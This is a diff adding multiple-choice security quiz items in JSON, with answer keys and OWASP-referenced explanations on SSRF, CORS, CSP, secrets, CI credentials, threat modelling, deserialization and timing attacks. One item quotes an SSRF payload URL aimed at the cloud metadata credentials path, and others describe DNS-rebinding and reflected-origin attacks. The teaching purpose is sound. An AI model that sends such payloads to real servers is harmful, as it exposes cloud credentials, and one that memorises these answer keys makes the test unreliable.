+    "referenceUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"
+  },
+  {
+    "id": "sec-ssrf-metadata",
+    "topic": "security",
+    "subtopic": "ssrf",
+    "difficulty": "Medium",
+    "title": "Image fetcher hits the metadata endpoint",
+    "question": "A feature on an EC2 instance downloads an image from any user-supplied URL. An attacker submits `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. What is the risk?",
+    "options": [
+      "Reflected XSS when the image preview renders the metadata response",
+      "DNS rebinding of the application's own hostname to the attacker",
+      "SSRF that exposes the instance role's temporary cloud credentials",
+      "Denial of service, because link-local addresses cannot be routed"
+    ],
+    "correctIndex": 2,
+    "explanation": "The server makes the request from inside the cloud network, where the link-local metadata service hands out IAM role credentials. Returning or leaking that response gives the attacker those privileges. Defences include allow-listing destinations, blocking internal and link-local ranges, and enforcing IMDSv2.",
+    "referenceUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
+  },
+  {
+    "id": "sec-ssrf-dns-rebinding",
+    "topic": "security",
+    "subtopic": "ssrf",
+    "difficulty": "Expert",
+    "title": "SSRF validation bypass",
+    "question": "To prevent SSRF, your code resolves the URL's hostname, rejects private and link-local IPs, then calls an HTTP client with the original URL. Attackers still reach 169.254.169.254. Which bypass explains this?",
+    "options": [
+      "The name resolves to a public IP during validation and to the internal IP at fetch time",
+      "The HTTP client ignores the hostname and always connects to the metadata address",
+      "Link-local addresses are excluded from private-range checks by the IP specification",
+      "IMDSv2 tokens let any request reach the metadata endpoint once one is issued"
+    ],
+    "correctIndex": 0,
+    "explanation": "Checking and connecting resolve DNS separately, so an attacker-controlled name with a tiny TTL can answer differently each time (DNS rebinding); following redirects to internal addresses has the same effect. Fix it by connecting to the exact validated IP, re-validating every redirect, and enforcing IMDSv2, whose PUT-obtained token blocks most simple SSRF.",
+    "referenceUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
+  },
+  {
+    "id": "sec-cors-reflect-origin",
+    "topic": "security",
+    "subtopic": "cors-headers-tls",
+    "difficulty": "Hard",
+    "title": "Reflecting Origin with credentials",
+    "question": "To fix a CORS error, a developer makes the API echo the request's Origin header into Access-Control-Allow-Origin and also sends `Access-Control-Allow-Credentials: true`. What is the consequence?",
+    "options": [
+      "Browsers block the response because a reflected origin is treated as a wildcard",
+      "Only same-site subdomains can read responses, because cookies are domain-scoped",
+      "Any website can make credentialed requests and read the victim's authenticated responses",
+      "Preflight requests fail, so only simple GET requests continue to work"
+    ],
+    "correctIndex": 2,
+    "explanation": "Browsers forbid '*' together with credentials, but an echoed concrete origin is accepted, so evil.example can read the victim's data using their cookies. The correct approach is an explicit allow-list of trusted origins. Browsers cannot tell a reflected value from a configured one, and preflights succeed with the echoed origin.",
+    "referenceUrl": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS"
+  },
+  {
+    "id": "sec-csp-nonce-strict-dynamic",
+    "topic": "security",
+    "subtopic": "cors-headers-tls",
+    "difficulty": "Medium",
+    "title": "Nonce-based CSP versus host allow-lists",
+    "question": "Why does OWASP favour a strict CSP such as `script-src 'nonce-{random}' 'strict-dynamic'` over a list of allowed script hosts like cdn.example.com?",
+    "options": [
+      "Host allow-lists are not supported by current browsers and are ignored",
+      "Allowed hosts often serve JSONP or old libraries that can be abused to run attacker-chosen code",
+      "Nonces remove the need for output encoding, so XSS cannot occur at all",
+      "strict-dynamic blocks every inline script, including those with a valid nonce"
+    ],
+    "correctIndex": 1,
+    "explanation": "Large CDNs and API hosts frequently expose endpoints or library versions that an attacker can use as script gadgets, making allow-lists bypassable. A per-response unguessable nonce lets only scripts the server intended run, and strict-dynamic extends trust to scripts they load. CSP is defence in depth, not a replacement for encoding, and nonced inline scripts do run.",
+    "referenceUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"
+  },
+  {
+    "id": "sec-secrets-runtime-injection",
+    "topic": "security",
+    "subtopic": "secrets",
+    "difficulty": "Easy",
+    "title": "Where a production DB password should live",
+    "question": "Where should the production database password for a containerised service be kept?",
+    "options": [
+      "In the Dockerfile as an ENV instruction so it ships with the image",
+      "In a .env file committed to a private repository",
+      "Hardcoded in the source code but obfuscated with base64",
+      "In a secrets manager, injected at runtime with access limited to that service"
+    ],
+    "correctIndex": 3,
+    "explanation": "A secrets manager provides access control, audit logging and rotation, and runtime injection keeps the secret out of images and source. ENV values are baked into image layers anyone with the image can read, private repositories are still widely cloned, and base64 is encoding, not protection.",
+    "referenceUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html"
+  },
+  {
+    "id": "sec-secrets-ci-oidc",
+    "topic": "security",
+    "subtopic": "secrets",
+    "difficulty": "Hard",
+    "title": "Removing long-lived cloud keys from CI",
+    "question": "A CI pipeline deploys to the cloud using a long-lived access key stored as a CI secret with broad permissions. What is the better design?",
+    "options": [
+      "Rotate the long-lived key monthly and keep it stored as a masked CI secret",
+      "Encrypt the key with a passphrase that is stored in a second CI secret",
+      "OIDC federation, where each job exchanges a signed token for short-lived, narrowly scoped credentials",
+      "Move the key into the repository's encrypted config file used at deploy time"
+    ],
+    "correctIndex": 2,
+    "explanation": "With OIDC, the CI provider issues a token describing the repository, branch and environment, and the cloud trust policy grants a role only to matching claims for a short time. No static secret exists to leak, and permissions can be scoped per job. Rotation shortens exposure but keeps a standing key, and encrypting the key just moves the secret.",
+    "referenceUrl": "https://docs.github.com/en/actions/concepts/security/openid-connect"
+  },
+  {
+    "id": "sec-threat-stride-tampering",
+    "topic": "security",
+    "subtopic": "owasp-threat-modeling",
+    "difficulty": "Easy",
+    "title": "Classifying a threat with STRIDE",
+    "question": "During threat modelling you note that an attacker on the internal network could modify order totals in transit between two services. Which STRIDE category is this?",
+    "options": [
+      "Spoofing",
+      "Tampering",
+      "Repudiation",
+      "Information disclosure"
+    ],
+    "correctIndex": 1,
+    "explanation": "Tampering is unauthorised modification of data, at rest or in transit; mutual TLS or message signing mitigates it. Spoofing is pretending to be someone else, repudiation is denying an action without proof, and information disclosure is reading data you should not see.",
+    "referenceUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Threat_Modeling_Cheat_Sheet.html"
+  },
+  {
+    "id": "sec-threat-trust-boundaries",
+    "topic": "security",
+    "subtopic": "owasp-threat-modeling",
+    "difficulty": "Medium",
+    "title": "Where to focus in a data flow diagram",
+    "question": "Your team has drawn a data flow diagram of a new payments feature. Where should threat analysis focus first?",
+    "options": [
+      "Data flows that cross trust boundaries, such as internet to API or API to third party",
+      "Internal function calls within a single service, where most bugs are found",
+      "Components that have had the most code changes in the last sprint",
+      "Database tables that store the largest volume of rows"
+    ],
+    "correctIndex": 0,
+    "explanation": "Trust boundaries mark where data moves between areas with different privileges or owners, which is where authentication, authorisation, validation and encryption decisions matter and where attackers enter. Calls inside one trust zone, code churn and table size are weaker signals of attack surface.",
+    "referenceUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Threat_Modeling_Cheat_Sheet.html"
+  },
+  {
+    "id": "sec-coding-deserialization",
+    "topic": "security",
+    "subtopic": "secure-coding",
+    "difficulty": "Hard",
+    "title": "Deserializing untrusted data",
+    "question": "A Java service accepts a base64 blob from clients and restores it with ObjectInputStream.readObject(). What is the main risk and remedy?",
+    "options": [
+      "The blob may be too large; cap the input size and readObject() becomes safe",
+      "Base64 can be tampered with; switch to hex encoding before deserializing",
+      "Deserialized objects may be stale; add a version field and reject old ones",
+      "Gadget chains can achieve remote code execution; accept a data-only format like JSON with a strict schema"
+    ],
+    "correctIndex": 3,
+    "explanation": "Native deserialization instantiates arbitrary classes on the classpath and runs their callbacks, so crafted object graphs can chain library code into command execution before your code ever inspects the result. Size limits and encodings do not change that; avoid native serialization for untrusted input, or at least use strict class allow-listing filters.",
+    "referenceUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+  },
+  {
+    "id": "sec-coding-constant-time-compare",
+    "topic": "security",
+    "subtopic": "secure-coding",
+    "difficulty": "Medium",
+    "title": "Comparing webhook signatures",
+    "question": "A webhook handler computes an HMAC and checks it with `if computed == request_signature:`. What is wrong and how is it fixed in Python?",
+    "options": [
+      "== compares object identity for strings; use computed.equals(request_signature)",
+      "HMACs must be decrypted before comparing; use hmac.decrypt first",
+      "Early-exit comparison leaks timing information; use hmac.compare_digest",
+      "The comparison is case-sensitive; lowercase both values before checking"
+    ],
+    "correctIndex": 2,
+    "explanation": "A normal comparison returns as soon as a byte differs, so response timing can reveal how many leading bytes are correct and allow a signature to be guessed incrementally. hmac.compare_digest takes time independent of where the difference is. In Python == compares values, and HMACs are not encrypted.",
+    "referenceUrl": "https://docs.python.org/3/library/hmac.html"
+  }
+]
